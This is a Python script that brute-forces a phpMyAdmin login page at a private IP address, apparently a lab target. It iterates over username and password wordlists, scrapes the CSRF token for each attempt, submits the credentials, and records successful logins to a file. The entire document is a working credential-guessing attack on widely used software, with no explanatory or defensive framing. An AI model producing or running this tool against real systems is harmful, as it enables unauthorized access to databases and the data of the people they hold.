
import requests
from bs4 import BeautifulSoup
import sys

# Target URL
url = "http://192.168.170.131/phpmyadmin/index.php"

# File paths for user and password lists
user_file = "/tmp/cleaned_users.txt"
password_file = "/tmp/cleaned_passwords.txt"

# Load username and password lists
with open(user_file, "r") as uf:
    users = [line.strip() for line in uf if line.strip()]

with open(password_file, "r", encoding="utf-8", errors="ignore") as pf:
    passwords = [line.strip() for line in pf if line.strip()]

print("Starting brute force...")

# Loop through all username and password combinations
for user in users:
    for password in passwords:
        # Create a new session for each attempt
        session = requests.Session()

        try:
            # Access the login page to get CSRF token
            response = session.get(url)
            soup = BeautifulSoup(response.text, 'html.parser')

            # Extracting CSRF token
            csrf_token = soup.find('input', {'name': 'token'})['value'] if soup.find('input', {'name': 'token'}) else None

            if not csrf_token:
                print("Failed to retrieve CSRF token. Retrying with next combination...")
                continue  # Skip this attempt and move to the next

            print(f"Trying {user}:{password} with CSRF token: {csrf_token}")

            # Setting cookies and sending login request with CSRF token
            cookies = {'token': csrf_token}
            payload = {
                'pma_username': user,
                'pma_password': password,
                'server': 1,
                'token': csrf_token
            }

            login_response = session.post(url, data=payload, cookies=cookies)

            # Checking login success
            if "Cannot log in to the MySQL server" not in login_response.text:
                print(f"Success! Username: {user}, Password: {password}")
                with open('/tmp/successful_logins.txt', 'a') as f:
                    f.write(f"{user}:{password}\n")
        except requests.RequestException as e:
            print(f"Network error: {e}. Skipping this attempt.")

print("Brute force completed.")
